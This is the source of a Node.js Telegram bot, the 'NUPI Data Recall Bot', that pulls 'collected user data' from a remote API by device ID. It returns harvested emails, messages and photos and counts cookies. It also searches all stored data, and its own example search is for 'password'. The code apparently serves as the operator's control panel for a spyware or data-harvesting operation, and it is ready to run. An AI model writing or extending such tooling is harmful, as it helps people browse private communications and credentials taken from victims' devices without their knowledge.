const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// Replace with your Telegram bot token
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const NUPI_API = process.env.NUPI_API || 'https://nupidesktopai.com';

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

console.log('🤖 NUPI Data Recall Bot started...');

// /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `
🤖 *NUPI Cloud Agent - Data Recall Bot*

Welcome! I can help you recall collected user data.

*Available Commands:*
📧 /emails [deviceId] - Get all collected emails
💬 /messages [deviceId] - Get all collected messages
🖼️ /photos [deviceId] - Get all collected photos
🔍 /search <query> - Search all collected data
📊 /latest [deviceId] - Get latest collected data
🆔 /devices - List all devices with data

*Examples:*
\`/emails abc123\`
\`/search password\`
\`/latest abc123\`
    `, { parse_mode: 'Markdown' });
});

// /emails command - Recall all emails
bot.onText(/\/emails(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /emails <deviceId>');
        return;
    }
    
    try {
        bot.sendMessage(chatId, '📧 Searching for emails...');
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query: '',
            deviceId,
            type: 'email'
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, '📭 No emails found for this device.');
            return;
        }
        
        let message = `📧 *Found ${response.data.count} Emails*\n\n`;
        
        response.data.results.slice(0, 10).forEach((result, i) => {
            message += `*Email ${i + 1}:*\n`;
            message += `Source: ${result.data.source}\n`;
            message += `Data: ${result.data.data.substring(0, 200)}...\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
        if (response.data.count > 10) {
            message += `\n_Showing 10 of ${response.data.count} emails_`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// /messages command - Recall all messages
bot.onText(/\/messages(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /messages <deviceId>');
        return;
    }
    
    try {
        bot.sendMessage(chatId, '💬 Searching for messages...');
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query: '',
            deviceId,
            type: 'message'
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, '💬 No messages found for this device.');
            return;
        }
        
        let message = `💬 *Found ${response.data.count} Messages*\n\n`;
        
        response.data.results.slice(0, 10).forEach((result, i) => {
            message += `*Message ${i + 1}:*\n`;
            message += `Source: ${result.data.source}\n`;
            message += `Data: ${result.data.data.substring(0, 200)}...\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
        if (response.data.count > 10) {
            message += `\n_Showing 10 of ${response.data.count} messages_`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// /photos command - Recall all photos
bot.onText(/\/photos(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /photos <deviceId>');
        return;
    }
    
    try {
        bot.sendMessage(chatId, '🖼️ Searching for photos...');
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query: '',
            deviceId,
            type: 'photo'
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, '🖼️ No photos found for this device.');
            return;
        }
        
        let message = `🖼️ *Found ${response.data.count} Photos*\n\n`;
        
        response.data.results.slice(0, 5).forEach((result, i) => {
            message += `*Photo ${i + 1}:*\n`;
            message += `URL: ${result.data.url}\n`;
            message += `Alt: ${result.data.alt}\n`;
            message += `Source Page: ${result.data.source}\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
        if (response.data.count > 5) {
            message += `\n_Showing 5 of ${response.data.count} photos_`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
        // Send actual photo URLs
        response.data.results.slice(0, 3).forEach(result => {
            try {
                bot.sendPhoto(chatId, result.data.url).catch(() => {});
            } catch (e) {}
        });
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// /search command - Search all collected data
bot.onText(/\/search (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const query = match[1];
    
    try {
        bot.sendMessage(chatId, `🔍 Searching for: "${query}"...`);
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, '❌ No results found.');
            return;
        }
        
        let message = `🔍 *Search Results for "${query}"*\n`;
        message += `Found ${response.data.count} matches\n\n`;
        
        response.data.results.slice(0, 5).forEach((result, i) => {
            message += `*Result ${i + 1}:*\n`;
            message += `Type: ${result.type}\n`;
            message += `Device: ${result.deviceId.substring(0, 20)}...\n`;
            message += `Data: ${JSON.stringify(result.data).substring(0, 150)}...\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
        if (response.data.count > 5) {
            message += `\n_Showing 5 of ${response.data.count} results_`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// /latest command - Get latest data
bot.onText(/\/latest(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /latest <deviceId>');
        return;
    }
    
    try {
        bot.sendMessage(chatId, '📊 Fetching latest data...');
        
        const response = await axios.get(`${NUPI_API}/api/user-data/latest/${deviceId}`);
        
        if (!response.data.data) {
            bot.sendMessage(chatId, '📭 No data collected yet for this device.');
            return;
        }
        
        const data = response.data.data;
        let message = `📊 *Latest Data from Device*\n\n`;
        message += `Device ID: ${data.deviceId.substring(0, 30)}...\n`;
        message += `Collected: ${new Date(data.collected).toLocaleString()}\n\n`;
        message += `📧 Emails: ${data.emails.length}\n`;
        message += `💬 Messages: ${data.messages.length}\n`;
        message += `🖼️ Photos: ${data.photos.length}\n`;
        message += `🍪 Cookies: ${data.cookies.length}\n\n`;
        
        if (data.emails.length > 0) {
            message += `*Recent Email:*\n${JSON.stringify(data.emails[0]).substring(0, 200)}...\n\n`;
        }
        
        if (data.messages.length > 0) {
            message += `*Recent Message:*\n${JSON.stringify(data.messages[0]).substring(0, 200)}...\n`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Handle all other messages
bot.on('message', (msg) => {
    // Only respond if not a command
    if (!msg.text || msg.text.startsWith('/')) return;
    
    bot.sendMessage(msg.chat.id, 
        '💡 Use /start to see available commands or /search to find data.'
    );
});

console.log('✅ Telegram recall bot is running!');
console.log('📱 Send messages to your bot to recall user data');
